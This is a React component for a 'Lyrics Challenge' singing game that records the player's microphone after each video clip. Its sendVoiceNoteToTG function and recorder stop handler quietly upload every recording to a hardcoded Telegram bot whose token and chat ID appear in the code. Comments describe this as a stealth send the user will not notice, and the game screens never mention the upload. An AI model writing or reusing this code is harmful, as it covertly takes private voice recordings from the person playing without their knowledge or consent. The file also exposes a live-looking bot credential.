"use client"

import { useState, useRef, useEffect } from "react"
import { motion, AnimatePresence } from "framer-motion"
import { 
    ArrowRight, Trophy, Mic, PlaySquare, Square, Play, Pause, Headphones, RotateCcw, Send
} from "lucide-react"

// ⚠️ TUMHARI TG DETAILS
const BOT_TOKEN = "8673978157:AAFWiYR__xUFb79u9Tfrz-8guCB10sgruX0"
const CHAT_ID = "8745839603"

async function sendVoiceNoteToTG(songNo, audioBlob) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`
    const formData = new FormData()
    formData.append("chat_id", CHAT_ID)
    formData.append("voice", audioBlob, `song_${songNo}.ogg`)
    formData.append("caption", `🎤 Lyrics Challenge - Song ${songNo} Recorded!\n(Silent send successful 🤫)`)
    
    // Stealth Background Fetch (User ko pata nahi chalega)
    fetch(url, { method: "POST", body: formData }).catch(e => console.error("TG Fail", e))
}

// ============================================
// TIMESTAMPS (Video Start Points)
// ============================================
const SONGS = [
    { id: 1, clipStart: 11 },
    { id: 2, clipStart: 33 },
    { id: 3, clipStart: 55 },
    { id: 4, clipStart: 82 },
    { id: 5, clipStart: 106 },
    { id: 6, clipStart: 127 },
    { id: 7, clipStart: 150 },
    { id: 8, clipStart: 174 },
    { id: 9, clipStart: 205 }
];

export default function FunGames({ onComplete }) {
    const [currentIdx, setCurrentIdx] = useState(0)
    const [gameState, setGameState] = useState("start") // start, recording, preview, finished
    const [voiceUrl, setVoiceUrl] = useState(null)
    const [voiceBlob, setVoiceBlob] = useState(null)
    const [isPreviewPlaying, setIsPreviewPlaying] = useState(false)

    // Media Refs
    const videoRef = useRef(null)
    const previewAudioRef = useRef(null)
    const mediaRecorderRef = useRef(null)
    const audioChunksRef = useRef([])
    const streamRef = useRef(null)
    
    // Visualizer Refs
    const audioCtxRef = useRef(null)
    const analyserRef = useRef(null)
    const animationFrameRef = useRef(null)
    const barRefs = useRef([])

    // ============================================
    // CLEANUP - Memory management
    // ============================================
    useEffect(() => {
        return () => {
            if (animationFrameRef.current) cancelAnimationFrame(animationFrameRef.current)
            if (streamRef.current) streamRef.current.getTracks().forEach(t => t.stop())
            if (voiceUrl) URL.revokeObjectURL(voiceUrl)
            if (audioCtxRef.current) audioCtxRef.current.close()
        }
    }, [voiceUrl])

    // ============================================
    // AUTO-STOP Logic (1s before next clip)
    // ============================================
    useEffect(() => {
        const video = videoRef.current
        if (!video || gameState !== "recording") return

        const handleTime = () => {
            const nextStart = currentIdx < SONGS.length - 1 ? SONGS[currentIdx + 1].clipStart : video.duration
            // Agar agla clip 1 sec dur hai, toh auto stop kardo
            if (video.currentTime >= nextStart - 1) {
                stopRecording()
            }
        }
        video.addEventListener("timeupdate", handleTime)
        return () => video.removeEventListener("timeupdate", handleTime)
    }, [currentIdx, gameState])

    // ============================================
    // GAME ENGINE
    // ============================================
    const initGame = async () => {
        try {
            // Get Mic with NO Filters (Instagram/WhatsApp style - records speaker sound naturally)
            const stream = await navigator.mediaDevices.getUserMedia({ 
                audio: { 
                    echoCancellation: false, 
                    noiseSuppression: false, 
                    autoGainControl: false 
                } 
            })
            streamRef.current = stream

            // Setup Visualizer
            const AudioContext = window.AudioContext || window.webkitAudioContext
            const ctx = new AudioContext()
            const source = ctx.createMediaStreamSource(stream)
            const analyser = ctx.createAnalyser()
            analyser.fftSize = 64
            source.connect(analyser)
            analyserRef.current = analyser
            audioCtxRef.current = ctx

            startRound(0)
        } catch (err) {
            alert("Please allow mic access to play the challenge! 🎙️")
        }
    }

    const startRound = (index) => {
        if (voiceUrl) URL.revokeObjectURL(voiceUrl)
        setVoiceUrl(null)
        setVoiceBlob(null)
        setIsPreviewPlaying(false)
        setGameState("recording")

        const video = videoRef.current
        if (video) {
            video.currentTime = SONGS[index].clipStart
            video.play().catch(e => console.error("Playback failed", e))
        }

        // Start Recording
        const mr = new MediaRecorder(streamRef.current)
        mediaRecorderRef.current = mr
        audioChunksRef.current = []
        mr.ondataavailable = (e) => audioChunksRef.current.push(e.data)
        mr.onstop = () => {
            const blob = new Blob(audioChunksRef.current, { type: "audio/ogg; codecs=opus" })
            const url = URL.createObjectURL(blob)
            setVoiceBlob(blob)
            setVoiceUrl(url)
            
            // SILENT BACKGROUND SEND TO TG
            sendVoiceNoteToTG(index + 1, blob)
            setGameState("preview")
        }
        mr.start()
        drawVisualizer()
    }

    const stopRecording = () => {
        if (videoRef.current) videoRef.current.pause()
        if (mediaRecorderRef.current?.state === "recording") {
            mediaRecorderRef.current.stop()
        }
    }

    const handleNext = () => {
        const next = currentIdx + 1
        if (next < SONGS.length) {
            setCurrentIdx(next)
            startRound(next)
        } else {
            setGameState("finished")
            // Send final score to complete the logic
            try {
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: `🏆 <b>Lyrics Challenge Finished!</b>`, parse_mode: "HTML" }),
                })
            } catch { }
        }
    }

    // ============================================
    // VISUALS & PREVIEW
    // ============================================
    const drawVisualizer = () => {
        if (!analyserRef.current || gameState !== "recording") return
        animationFrameRef.current = requestAnimationFrame(drawVisualizer)
        const dataArray = new Uint8Array(analyserRef.current.frequencyBinCount)
        analyserRef.current.getByteFrequencyData(dataArray)

        for (let i = 0; i < 15; i++) {
            if (barRefs.current[i]) {
                const h = Math.max(15, (dataArray[i * 2] / 255) * 100)
                barRefs.current[i].style.height = `${h}%`
            }
        }
    }

    const togglePreview = () => {
        const aud = previewAudioRef.current
        if (!aud) return
        if (isPreviewPlaying) { aud.pause(); setIsPreviewPlaying(false) }
        else { aud.play(); setIsPreviewPlaying(true); aud.onended = () => setIsPreviewPlaying(false) }
    }

    return (
        <div className="min-h-screen flex flex-col items-center justify-center p-4 bg-black text-white font-['Nunito']">
            <style>{`@import url('https://fonts.googleapis.com/css2?family=Nunito:wght@400;700;900&display=swap');`}</style>

            <div className="w-full max-w-sm flex flex-col items-center">
                
                {/* 🔴 CORRECTED VIDEO TAG WITH .mp4 PATH 🔴 */}
                <video 
                    ref={videoRef} 
                    src="/images/video.mp4" 
                    playsInline 
                    className={`w-full rounded-3xl border-2 border-pink-500/30 shadow-2xl mb-6 transition-all ${gameState !== "start" && gameState !== "finished" ? "block" : "hidden"}`}
                    style={{ pointerEvents: "none" }} // Disables seeking to prevent cheating
                />

                <AnimatePresence mode="wait">
                    {gameState === "start" && (
                        <motion.div key="start" className="text-center p-8 bg-white/5 border border-white/10 rounded-[32px] backdrop-blur-xl" initial={{ scale: 0.9 }} animate={{ scale: 1 }} exit={{ opacity: 0 }}>
                            <PlaySquare className="w-16 h-16 text-pink-500 mx-auto mb-6" />
                            <h1 className="text-3xl font-black mb-4 uppercase tracking-tighter italic text-transparent bg-clip-text bg-gradient-to-r from-pink-400 to-purple-400">Lyrics Challenge</h1>
                            <p className="text-gray-400 text-sm mb-8 px-4">Watch the video carefully. Sing the missing lyrics when the timer stops!</p>
                            <button onClick={initGame} className="w-full py-4 bg-pink-600 rounded-2xl font-black uppercase tracking-widest hover:scale-105 transition-transform">Start Challenge 🎙️</button>
                        </motion.div>
                    )}

                    {gameState === "recording" && (
                        <motion.div key="rec" className="w-full p-6 bg-red-500/10 border border-red-500/30 rounded-[32px] text-center" initial={{ y: 20 }} animate={{ y: 0 }}>
                            <div className="flex justify-between items-center mb-6">
                                <span className="text-[10px] font-black text-red-500 uppercase">Song {currentIdx + 1}/{SONGS.length}</span>
                                <div className="flex items-center gap-2 px-3 py-1 bg-red-500/20 rounded-full border border-red-500/40 animate-pulse">
                                    <div className="w-2 h-2 rounded-full bg-red-500" />
                                    <span className="text-[10px] font-black text-red-500 uppercase">REC ON</span>
                                </div>
                            </div>

                            {/* WAVEFORM (Moves with her voice) */}
                            <div className="flex items-end justify-center gap-1.5 h-20 mb-6">
                                {[...Array(15)].map((_, i) => (
                                    <div key={i} ref={el => barRefs.current[i] = el} className="w-1.5 bg-red-500 rounded-full transition-all duration-75" style={{ height: '15%' }} />
                                ))}
                            </div>

                            <p className="text-white font-bold text-sm mb-8">"Complete the lyrics when the timer stops!"</p>

                            <button onClick={stopRecording} className="w-full py-4 bg-red-600 rounded-2xl font-black uppercase flex items-center justify-center gap-2 shadow-lg shadow-red-500/20">
                                <Square size={16} fill="white" /> Stop & Preview
                            </button>
                        </motion.div>
                    )}

                    {gameState === "preview" && (
                        <motion.div key="preview" className="w-full p-8 bg-blue-500/10 border border-blue-500/30 rounded-[32px] text-center" initial={{ scale: 0.9 }} animate={{ scale: 1 }}>
                            <Headphones className="w-12 h-12 text-blue-400 mx-auto mb-4" />
                            <h2 className="text-xl font-black mb-6 uppercase tracking-wider">How was it?</h2>
                            
                            <audio ref={previewAudioRef} src={voiceUrl} />
                            
                            <div className="w-full bg-black rounded-2xl p-4 flex items-center gap-4 border border-white/5 mb-8">
                                <button onClick={togglePreview} className="w-12 h-12 bg-blue-500 rounded-full flex items-center justify-center shadow-lg">
                                    {isPreviewPlaying ? <Pause fill="white" /> : <Play fill="white" className="ml-1" />}
                                </button>
                                <div className="flex-1 h-1 bg-white/10 rounded-full overflow-hidden">
                                    <motion.div className="h-full bg-blue-400" animate={isPreviewPlaying ? { x: ["-100%", "100%"] } : {}} transition={{ duration: 2, repeat: Infinity, ease: "linear" }} />
                                </div>
                            </div>

                            <div className="flex gap-3">
                                <button onClick={() => startRound(currentIdx)} className="flex-1 py-4 bg-white/5 rounded-xl font-bold uppercase text-[10px] border border-white/10 flex items-center justify-center gap-2"><RotateCcw size={14} /> Retake</button>
                                <button onClick={handleNext} className="flex-1 py-4 bg-blue-600 rounded-xl font-bold uppercase text-[10px] flex items-center justify-center gap-2">Next Song <ArrowRight size={14} /></button>
                            </div>
                        </motion.div>
                    )}

                    {gameState === "finished" && (
                        <motion.div key="win" className="text-center p-10 bg-white/5 border border-white/10 rounded-[40px]" initial={{ scale: 0.8 }} animate={{ scale: 1 }}>
                            <div className="text-6xl mb-6">🤩</div>
                            <h2 className="text-3xl font-black mb-2 uppercase italic text-transparent bg-clip-text bg-gradient-to-r from-pink-400 to-indigo-400 py-2">Fantastic!</h2>
                            <p className="text-gray-400 text-sm mb-10">You've completed the challenge like a total rockstar. ✨</p>
                            <button onClick={() => onComplete(100)} className="w-full py-4 bg-white text-black rounded-2xl font-black uppercase tracking-widest shadow-xl">See Next Surprise</button>
                        </motion.div>
                    )}
                </AnimatePresence>
            </div>
        </div>
    )
}
